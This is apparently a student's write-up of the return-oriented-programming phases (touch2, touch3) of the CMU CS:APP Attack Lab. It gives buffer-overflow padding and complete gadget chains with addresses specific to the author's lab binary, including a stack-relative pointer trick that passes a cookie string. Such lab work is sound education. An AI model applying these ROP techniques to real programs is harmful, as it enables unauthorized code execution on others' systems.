# rtarget
This target enforces the user to use Return Oriented Programming.

*reference*: [https://csapp.cs.cmu.edu/3e/attacklab.pdf](https://csapp.cs.cmu.edu/3e/attacklab.pdf)

> Every 0x000000000000000 formatted number in this page is a gadget pointer found specificaly in my binary.


## touch2
The idea here is to generate the same cookie as the one inside 'cookie' global variable.
This can be achieved by calling `gencookie` with the same input as the one used to generate the cookie in the first place.

That is, `rdi` needs to be set to 1 (first arg to `gencookie` is in `rdi`) and then call `gencookie`. No direct way to set `rdi` to 1, but we can use the following gadget chain:
```
0x0000000000401994 // mov eax, 1
0x00000000004019a2 // mov rdi, rax
0x0000000000402DDE // call gencookie(1) => (rax=0xcookie)
```

> The return value (in rax) will be the same as the cookie.

Move rax->rdi, Then we can call touch2() with the cookie.
```
0x00000000004019a2 // mov rdi, rax
0x00000000004017EC // call touch2(0xcookie)
```

Complete gadget chain:
```
0x00*40            // 40 bytes of garbage to pad all the buffer

0x0000000000401994 // mov eax, 1
0x00000000004019a2 // mov rdi, rax
0x0000000000402DDE // call gencookie (cookie is in rax!)
0x00000000004019a2 // mov rdi, rax
0x00000000004017EC // call touch2
```

## touch3
This phase is a bit more tricky. The touch3() function takes a string pointer as an argument, and the string needs to be the hex representation of the cookie (0x59b997fa). My cookie was 0x59b997fa so the array should be [0x35, 0x39, 0x62, 0x39, 0x39, 0x37, 0x66, 0x61] (which is the string "59b997fa"). We can use the stack itself to store the string, and then pass a pointer to it to touch3(). We strategically place the string further down the stack, and with the use of add_xy() we can get a pointer to it.

First thing, we need to save the current stack pointer. Remember! rsp does NOT include these 8 bytes of the return address because its already been popped. This will be relevant later on.
```
0x0000000000401a06 // mov rax, rsp;
```

We save the stack pointer in rdi for later use.
```
0x00000000004019a2 // mov rdi, rax;
```

Now, we need to add the offset to the buffer. BUT, we don't know the offset (yet). So for now we will just put a placeholder for the offset. We will calculate it later on.
```
0x00000000004019ab // pop rax; nop;
0x0000000000000000 // literal offset to buffer; (will be calculated later)
```

We want now to call add_xy with the stack pointer stored in rdi and the offset. To get the offset to rsi, but there is no direct rax->rsi opcode unfortiniatlly. We need to use a middle men `rdx` and `rcx`.
The result will be stored in rax and will be the exact pointer to the buffer.
```
0x00000000004019dd // mov edx, eax;
0x0000000000401a34 // mov ecx, edx;
0x0000000000401a13 // mov esi, ecx;
0x00000000004019D6 // call add_xy;
```

Finally , we can call touch3() with the pointer to the buffer stored in rax. We'll add the literal string at the end.
```
0x00000000004019a2 // mov rdi, rax;
0x00000000004018FA // call touch3;
0x6166373939623935 // Literal cookie in hex string;
```

We can now calculate the literal offset to the buffer. Every row is 8-bytes long. The gap between the stack pointer to the buffer is 9 rows, 9 * 8 = 72 bytes (0x48). So we replace the literal offset to the buffer with 0x48.
```
0x0000000000000048 // (literal offset to buffer);
```

The complete gadget chain for touch3() is as follows:
```
0x00*40            // 40 bytes of garbage to pad all the buffer

0x0000000000401a06 // mov rax, rsp;
0x00000000004019a2 // mov rdi, rax; <------------------------|
0x00000000004019ab // pop rax; nop;                          |
0x0000000000000048 // (literal offset to buffer);            |
0x00000000004019dd // mov edx, eax;                          |
0x0000000000401a34 // mov ecx, edx;                          | GAP TO BUFFER (9 rows of 8-bytes = 0x48)
0x0000000000401a13 // mov esi, ecx;                          |
0x00000000004019D6 // call add_xy;                           |
0x00000000004019a2 // mov rdi, rax;                          |
0x00000000004018FA // call touch3;  <------------------------|
0x6166373939623935 // (Literal cookie in hex string);
```